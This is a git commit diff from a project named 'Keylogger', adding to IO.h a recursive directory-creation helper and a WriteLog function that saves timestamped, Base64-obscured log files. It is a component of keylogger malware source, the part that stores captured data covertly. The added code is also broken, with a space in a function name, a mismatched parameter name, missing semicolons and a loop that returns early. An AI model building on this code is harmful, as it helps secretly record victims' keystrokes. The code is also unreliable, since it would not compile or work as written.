8a9e5b600ccb5e335c5a13f8d3ade217456dd06e
DESKTOP-8M0J74Q\User <nwy140@gmail.com>
2018-01-06 14:42:23 +0800

    Create new method to make new directory if doesnt exist

--- Keylogger/IO.h
+++ Keylogger/IO.h
@@ -21,8 +21,47 @@
         return (bool) CreateDirectory(path.c_str(),NULL)
          || GetLastError() == ERROR_ALREADY_EXISTS;
     }
- }
+    bool MKDir(std::string Path)
+    {
+        for (char &c : path)
+            {
+                if  (c =='\\')
+                {
+                        c='\0'; //turns c to null
+                        if (!MkOneDr(path))
+                        return false;
+                        c = '\\'
+                }
+                return true;
+            }
+    }
+    template <class T>
+    std::string Write Log(const T &t)
+    {
+        std::string path = GetOurPath(true);
+        Helper::DateTime dt;
+        std::string name = dt.GetDateTimeString("_") + ".log";
+        try
+        {
+            std::ofstream file (path + name);
+            if (!file) return "";
+            std::ostringstream s;
+            s << "[" << dt.GetDateTimeString() << "]" <<
+            std::endl << t <<std::endl;
+            std::string data = Base64::EncryptB64(s.str());
+            file << data;
+            if(!file) {return "";}
+            file.close();
+            return name;
+        }
+        catch (...)
+        {
+            return "";
+        }
 
+    }
+ }
+#endif // IO_H
 
 
 
